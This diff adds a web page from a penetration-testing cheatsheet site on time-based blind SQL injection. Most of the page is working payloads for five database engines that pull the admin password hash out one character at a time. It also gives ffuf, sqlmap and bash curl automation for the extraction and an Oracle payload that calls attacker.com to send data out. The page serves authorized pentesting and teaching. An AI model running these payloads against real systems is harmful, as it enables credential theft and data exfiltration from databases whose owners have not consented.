@@ -1,0 +1,156 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Time-based Blind SQLi · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › SQL Injection</nav><h1>Time-based Blind SQLi</h1><p class="cx-lede">Extracting data via measurable response delays when no other feedback is available.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1213</span><span class="cx-tag">D3FEND D3-MH, D3-NTA</span><span class="cx-tag">IMPACT DataExfil</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><p>The application's response is identical regardless of injection - but if you make the database sleep, the response takes longer. Use timing as your boolean oracle.</p>
+<h2 id="tldr">TL;DR</h2>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">MySQL / MariaDB</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; AND IF(SUBSTRING((SELECT password FROM users WHERE username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;, SLEEP(5), 0)-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">PostgreSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27;; SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27; THEN pg_sleep(5) ELSE pg_sleep(0) END-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">MSSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27;; IF (SUBSTRING((SELECT password FROM users WHERE username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27;) WAITFOR DELAY &#x27;0:0:5&#x27;-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Oracle</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; AND 1=(CASE WHEN SUBSTR((SELECT password FROM users WHERE username=&#x27;admin&#x27;),1,1)=&#x27;a&#x27; THEN dbms_pipe.receive_message((&#x27;a&#x27;),5) ELSE 1 END)-- -</code></pre></figure>
+</div>
+</div>
+<p>If response takes ~5s, the condition was true. Otherwise false.</p>
+<h2 id="when-to-use">When to use</h2>
+<p>When no other technique works:
+- No errors visible
+- Response identical for true and false conditions
+- No out-of-band path available (DNS/HTTP egress blocked)</p>
+<p>Also useful for <strong>detection</strong> before extraction - if <code>SLEEP(5)</code> causes a 5-second delay, you have injection.</p>
+<h2 id="per-dbms-sleep-payloads">Per-DBMS sleep payloads</h2>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">MySQL / MariaDB</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Simple delay (always sleeps if injection works)
+&#x27; AND SLEEP(5)-- -
+&#x27;; SELECT SLEEP(5)-- -                    -- if stacked queries supported
+
+-- Conditional delay
+&#x27; AND IF(&lt;CONDITION&gt;, SLEEP(5), 0)-- -
+&#x27; AND SLEEP(IF(&lt;CONDITION&gt;, 5, 0))-- -
+
+-- Heavy query alternative (when SLEEP is filtered)
+&#x27; AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B)-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">PostgreSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Simple delay
+&#x27;; SELECT pg_sleep(5)-- -
+&#x27; || pg_sleep(5)-- -
+
+-- Conditional
+&#x27;; SELECT CASE WHEN &lt;CONDITION&gt; THEN pg_sleep(5) ELSE pg_sleep(0) END-- -
+&#x27; AND (SELECT CASE WHEN &lt;CONDITION&gt; THEN pg_sleep(5) ELSE NULL END) IS NULL-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">MSSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Requires stacked queries support
+&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;-- -
+
+-- Conditional
+&#x27;; IF (&lt;CONDITION&gt;) WAITFOR DELAY &#x27;0:0:5&#x27;-- -
+
+-- Inline (no stacked queries)
+&#x27; AND 1=(CASE WHEN &lt;CONDITION&gt; THEN (SELECT count(*) FROM sysobjects A, sysobjects B, sysobjects C) ELSE 1 END)-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Oracle</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- Built-in sleep is blocked in many configurations; use:
+&#x27; AND 1=(CASE WHEN &lt;CONDITION&gt; THEN dbms_pipe.receive_message((&#x27;a&#x27;),5) ELSE 1 END)-- -
+
+-- Heavy query alternative
+&#x27; AND 1=(SELECT count(*) FROM all_objects A, all_objects B WHERE &lt;CONDITION&gt;)-- -
+
+-- DNS-based exfil (also out-of-band, see out-of-band page)
+&#x27; AND DBMS_LDAP.INIT((&#x27;attacker.com&#x27;,80))=1-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">SQLite</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">-- No native sleep - use heavy query
+&#x27; AND randomblob(100000000)-- -
+&#x27; AND CASE WHEN &lt;CONDITION&gt; THEN randomblob(100000000) ELSE 0 END-- -</code></pre></figure>
+</div>
+</div>
+<h2 id="extraction-workflow">Extraction workflow</h2>
+<p>Identical to <a href="../blind-boolean/index.html">Boolean blind</a>, but the oracle is "did the response take &gt;Nms?":</p>
+<ol>
+<li>Establish baseline response time (e.g., 200ms).</li>
+<li>Establish "true" response time with a known-true condition that triggers SLEEP.</li>
+<li>For each character position, binary-search ASCII via timing.</li>
+</ol>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>Pick a sleep duration well above network jitter - typically 3–5 seconds. Below 1s is unreliable; above 10s wastes time.</p>
+</div>
+<h2 id="automation">Automation</h2>
+<h3 id="ffuf-with-timing-filter"><code>ffuf</code> with timing filter</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">ffuf -w chars.txt:CHAR \
+  -u &quot;https://&lt;TARGET&gt;/page&quot; \
+  -H &quot;Cookie: id=xyz&#x27; AND IF(SUBSTRING((SELECT password FROM users WHERE username=&#x27;admin&#x27;),1,1)=&#x27;CHAR&#x27;, SLEEP(3), 0)-- -&quot; \
+  -t 1 \
+  -p 0.1 \
+  -mt &quot;&gt;2500&quot;</code></pre></figure>
+<p><code>-mt "&gt;2500"</code> matches responses over 2500ms. <code>-t 1</code> keeps it single-threaded so timing is reliable.</p>
+<h3 id="sqlmap"><code>sqlmap</code></h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">sqlmap -u &quot;https://&lt;TARGET&gt;/page?id=1&quot; --technique=T --dbms=mysql --dump</code></pre></figure>
+<p><code>--technique=T</code> restricts to time-based. <code>sqlmap</code> tunes the delay automatically based on observed jitter.</p>
+<h3 id="bash-loop">Bash loop</h3>
+<figure class="cx-code"><figcaption>bash</figcaption><pre><code class="language-bash">target=&quot;https://&lt;TARGET&gt;/page&quot;
+extracted=&quot;&quot;
+
+for pos in {1..32}; do
+  for c in {a..f} {0..9}; do  # narrow charset for hex hash
+    start=$(date +%s%N)
+    curl -s -o /dev/null \
+      -H &quot;Cookie: id=xyz&#x27; AND IF(SUBSTRING((SELECT password FROM users WHERE username=&#x27;admin&#x27;),$pos,1)=&#x27;$c&#x27;, SLEEP(3), 0)-- -&quot; \
+      &quot;$target&quot;
+    end=$(date +%s%N)
+    elapsed_ms=$(( (end - start) / 1000000 ))
+    if [ &quot;$elapsed_ms&quot; -gt 2500 ]; then
+      extracted=&quot;${extracted}${c}&quot;
+      echo &quot;Position $pos: $c (so far: $extracted)&quot;
+      break
+    fi
+  done
+done
+echo &quot;Final: $extracted&quot;</code></pre></figure>
+<h2 id="considerations">Considerations</h2>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p><strong>Connection pools.</strong> Some apps pool DB connections. A <code>SLEEP()</code> query may block the pool and cause unrelated user traffic to slow down. Be aware of impact during business-hours testing.</p>
+</div>
+<ul>
+<li><strong>Network jitter</strong> - set the delay long enough to cleanly distinguish true (5s) from baseline (200ms). Don't use 1s delays unless the network is exceptionally clean.</li>
+<li><strong>Concurrency</strong> - keep extraction single-threaded. Multiple threads measuring the same target's response time interfere with each other.</li>
+<li><strong>Asynchronous queries</strong> - PostgreSQL's <code>pg_sleep</code> blocks the request. But some Node.js/asyncio apps use connection pools where the sleep blocks one connection without delaying the response. Test with a known-true <code>SLEEP</code> first to confirm timing actually changes.</li>
+<li><strong>WAF time-based filtering</strong> - some WAFs strip <code>SLEEP(</code>. Use <code>BENCHMARK(10000000, MD5(1))</code> (MySQL) or heavy query alternatives.</li>
+<li><strong><code>AND</code> vs <code>OR</code> evaluation</strong> - <code>AND SLEEP(5)</code> only fires if the left side is true. If you want unconditional delay (for detection), use <code>OR SLEEP(5)</code> or terminate with <code>;</code>.</li>
+</ul>
+<h2 id="detection-only-payloads">Detection-only payloads</h2>
+<p>When you only want to confirm injection (not extract data), unconditional sleep:</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27;; SELECT pg_sleep(5)-- -                  -- PostgreSQL
+&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;-- -               -- MSSQL
+&#x27; OR SLEEP(5)-- -                          -- MySQL
+&#x27; OR (SELECT 1 FROM (SELECT SLEEP(5))a)-- - -- MySQL with subquery</code></pre></figure>
+<p>Repeat 3 times. If all three add ~5s, injection confirmed.</p>
+<h2 id="notes">Notes</h2>
+<ul>
+<li>Time-based is slow. A 32-char password at 5s per character with binary search is ~32 × 7 × 5s = ~19 minutes. Plan accordingly.</li>
+<li>Combine with <code>LIMIT 1 OFFSET &lt;N&gt;</code> to walk through rows when extracting multiple records.</li>
+<li>For cases where the application's response time naturally varies a lot (e.g., shared hosting under load), increase delay to 10s or run each test multiple times and take the median.</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../blind-boolean/index.html">Previous: Boolean-based Blind SQLi</a><a class="cx-next" href="../sqlmap/troubleshooting/index.html">Next: Troubleshooting</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
